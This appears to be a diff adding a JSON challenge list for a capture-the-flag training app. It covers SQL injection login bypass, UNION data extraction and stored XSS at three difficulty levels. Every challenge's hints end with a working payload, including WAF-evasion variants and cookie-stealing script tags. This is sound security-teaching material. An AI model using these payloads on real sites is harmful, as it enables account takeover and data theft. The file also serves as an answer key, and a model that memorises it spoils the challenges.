@@ -1,0 +1,146 @@
+[
+  {
+    "id": "blog-sqli-login-easy",
+    "app": "blog-sqli",
+    "title": "Blog - SQLi Login Bypass (Easy)",
+    "difficulty": "easy",
+    "points": 100,
+    "category": "SQL Injection",
+    "owasp": "A03:2021-Injection",
+    "description": "Bypass administrative authentication on the blog login portal using a classic SQL injection query concatenation payload.",
+    "flag_env": "FLAG_BLOG_SQLI_LOGIN_EASY",
+    "hints": [
+      "Inspect the username parameter formatting in the SQL authentication query.",
+      "SQL comment syntax '--' or '/*' can be used to discard the subsequent password verification check.",
+      "Input payload: ' OR 1=1-- or admin'--"
+    ]
+  },
+  {
+    "id": "blog-sqli-login-medium",
+    "app": "blog-sqli",
+    "title": "Blog - SQLi Login Bypass (Medium)",
+    "difficulty": "medium",
+    "points": 200,
+    "category": "SQL Injection",
+    "owasp": "A03:2021-Injection",
+    "description": "Bypass administrative authentication when common SQL boolean keywords 'OR' and 'AND' as well as '--' comments are blacklisted.",
+    "flag_env": "FLAG_BLOG_SQLI_LOGIN_MEDIUM",
+    "hints": [
+      "The application WAF inspects both username and password for case-insensitive matches against 'OR', 'AND', and '--'.",
+      "SQLite supports block comments '/* ... */' as well as alternative operators.",
+      "Input payload: admin'/* or admin' # or admin' || '1'='1"
+    ]
+  },
+  {
+    "id": "blog-sqli-login-hard",
+    "app": "blog-sqli",
+    "title": "Blog - SQLi Login Bypass (Hard)",
+    "difficulty": "hard",
+    "points": 300,
+    "category": "SQL Injection",
+    "owasp": "A03:2021-Injection",
+    "description": "Bypass administrative authentication when all spaces and standard comment markers are strictly blocked by the application WAF.",
+    "flag_env": "FLAG_BLOG_SQLI_LOGIN_HARD",
+    "hints": [
+      "Spaces and comment indicators ('--', '/*', '#') are blocked by input filters.",
+      "SQL queries can be constructed without spaces using tab characters, newlines, or parenthesis groupings.",
+      "Input payload: admin'OR('1'='1')OR''=' or admin'\\tOR\\t''='"
+    ]
+  },
+  {
+    "id": "blog-sqli-union-easy",
+    "app": "blog-sqli",
+    "title": "Blog - UNION Data Extraction (Easy)",
+    "difficulty": "easy",
+    "points": 100,
+    "category": "SQL Injection",
+    "owasp": "A03:2021-Injection",
+    "description": "Exploit the blog search feature using a UNION SELECT attack to extract hidden flags stored in the 'flags' table.",
+    "flag_env": "FLAG_BLOG_SQLI_UNION_EASY",
+    "hints": [
+      "Determine the number of columns returned by the post search query (5 columns: id, title, content, created_at, author).",
+      "Look into the SQLite schema or query the 'flags' table directly.",
+      "Input payload: ' UNION SELECT 1, name, flag, description, 'author' FROM flags--"
+    ]
+  },
+  {
+    "id": "blog-sqli-union-medium",
+    "app": "blog-sqli",
+    "title": "Blog - UNION Data Extraction (Medium)",
+    "difficulty": "medium",
+    "points": 200,
+    "category": "SQL Injection",
+    "owasp": "A03:2021-Injection",
+    "description": "Extract hidden flags from the 'flags' table when a defensive filter strips 'UNION' and 'SELECT' keywords once.",
+    "flag_env": "FLAG_BLOG_SQLI_UNION_MEDIUM",
+    "hints": [
+      "The server applies a single-pass, non-recursive strip of the words 'UNION' and 'SELECT'.",
+      "Nesting the stripped words inside themselves (e.g. UNUNIONION) rebuilds the keyword after removal.",
+      "Input payload: ' UNUNIONION SELSELECTECT 1, name, flag, description, 'author' FROM flags--"
+    ]
+  },
+  {
+    "id": "blog-sqli-union-hard",
+    "app": "blog-sqli",
+    "title": "Blog - UNION Data Extraction (Hard)",
+    "difficulty": "hard",
+    "points": 300,
+    "category": "SQL Injection",
+    "owasp": "A03:2021-Injection",
+    "description": "Extract hidden flags from the 'flags' table when spaces and direct keyword patterns are blocked by the WAF.",
+    "flag_env": "FLAG_BLOG_SQLI_UNION_HARD",
+    "hints": [
+      "Whitespace characters are blocked, and 'union select' or 'from flags' regex patterns trigger a 400 error.",
+      "SQL allows inline block comments '/**/' to serve as token delimiters without using literal spaces.",
+      "Input payload: '/**/UNION/**/SELECT/**/1,name,flag,description,'author'/**/FROM/**/flags--"
+    ]
+  },
+  {
+    "id": "blog-sqli-xss-easy",
+    "app": "blog-sqli",
+    "title": "Blog - Stored XSS in Comments (Easy)",
+    "difficulty": "easy",
+    "points": 100,
+    "category": "Cross-Site Scripting",
+    "owasp": "A03:2021-Injection",
+    "description": "Inject stored JavaScript markup into blog comments to capture the admin bot's session cookie containing the flag.",
+    "flag_env": "FLAG_BLOG_SQLI_XSS_EASY",
+    "hints": [
+      "Blog comments are rendered directly using Jinja2's '| safe' filter without HTML escaping.",
+      "Submit a comment with a <script> tag and trigger the Admin Review bot via the UI or /api/admin/visit-comments.",
+      "Payload: <script>fetch('/api/exfil?c=' + document.cookie)</script>"
+    ]
+  },
+  {
+    "id": "blog-sqli-xss-medium",
+    "app": "blog-sqli",
+    "title": "Blog - Stored XSS in Comments (Medium)",
+    "difficulty": "medium",
+    "points": 200,
+    "category": "Cross-Site Scripting",
+    "owasp": "A03:2021-Injection",
+    "description": "Execute stored XSS when the application strips lowercase <script> tags from incoming comment submissions.",
+    "flag_env": "FLAG_BLOG_SQLI_XSS_MEDIUM",
+    "hints": [
+      "The filter only removes lowercase '<script>' tags.",
+      "HTML elements like <img> or <svg> with event handlers execute JavaScript when rendered in browser contexts.",
+      "Payload: <img src=x onerror=\"fetch('/api/exfil?c=' + document.cookie)\"> or <SCRIPT>alert(document.cookie)</SCRIPT>"
+    ]
+  },
+  {
+    "id": "blog-sqli-xss-hard",
+    "app": "blog-sqli",
+    "title": "Blog - Stored XSS in Comments (Hard)",
+    "difficulty": "hard",
+    "points": 300,
+    "category": "Cross-Site Scripting",
+    "owasp": "A03:2021-Injection",
+    "description": "Execute stored XSS when script tags and standard whitespace-delimited onerror and onload handlers are filtered.",
+    "flag_env": "FLAG_BLOG_SQLI_XSS_HARD",
+    "hints": [
+      "The filter strips <script> and matches whitespace before 'onerror' or 'onload'.",
+      "HTML parsers accept slashes '/' instead of whitespace between tag names and attributes in SVG elements.",
+      "Payload: <svg/onload=alert(document.cookie)> or <iframe srcdoc=\"...\"> or <a href=\"javascript:...\">"
+    ]
+  }
+]
